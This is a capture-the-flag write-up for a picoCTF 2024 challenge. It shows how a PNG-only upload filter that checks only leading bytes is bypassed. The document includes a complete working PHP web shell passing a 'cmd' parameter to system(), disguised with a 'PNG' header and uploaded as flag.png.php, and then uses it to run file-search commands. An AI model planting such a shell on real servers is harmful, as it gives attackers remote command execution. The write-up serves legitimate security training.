# Description

_#Medium_<br>
_#Binary_Exploitation_<br>
_#picoCTF_2024_<br>
_#browser_webshell_solvable_<br>

I found a web app that can help process images: PNG images only!

## Solution

At first, I tried uploading a PNG file to see what happens on the website and in Burp Suite.<br>

![image](https://github.com/user-attachments/assets/65d68ea5-46d5-471b-a432-3da81d544cca)
**This is what I got from the website: it says the uploaded file is a valid PNG file. Now it is time to investigate how the system defines a PNG file.*

![image](https://github.com/user-attachments/assets/707cc9a2-1e0d-4cc9-aa22-1205b33da0e3)
**This is the result I got from Burp Suite. From the raw data shown, we can see that the system defines PNG files by checking the first few characters, "PNG".*

Hence, through observation, we can create a PHP script by adding 'PNG' as the first few characters and then insert the script into the system folder. We believe the uploaded files will be stored in the 'uploads' folder, which can be easily accessed through the site. <br>

```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
**This is the script that we will use. Insert this php script into a notepad and save as ***flag.png.php***. Then upload this file to the system and we'll get a successful message.*<br>

To get use of the script inserted, we then go to the website to get the file uploaded by adding the uploaded file path ***/uploads/flag.png.php*** to the site ***http://atlas.picoctf.net:60355***. We will use this field to enter a command `find / -name '*.txt'` to list down all the txt file.<br>

![image](https://github.com/user-attachments/assets/1615bc9d-cf02-43e7-8dce-a983f9b04bd9)
**This is the list of all txt files. There is a suspicious file name, which is ***/var/www/html/GAZWIMLEGU2DQ.txt***. So I decided to open it to have a look by inputting the command `cat /var/www/html/GAZWIMLEGU2DQ.txt`.*

![image](https://github.com/user-attachments/assets/710971f2-22f1-41e2-8325-cb6f19784c64)
**Here you got the flag.*
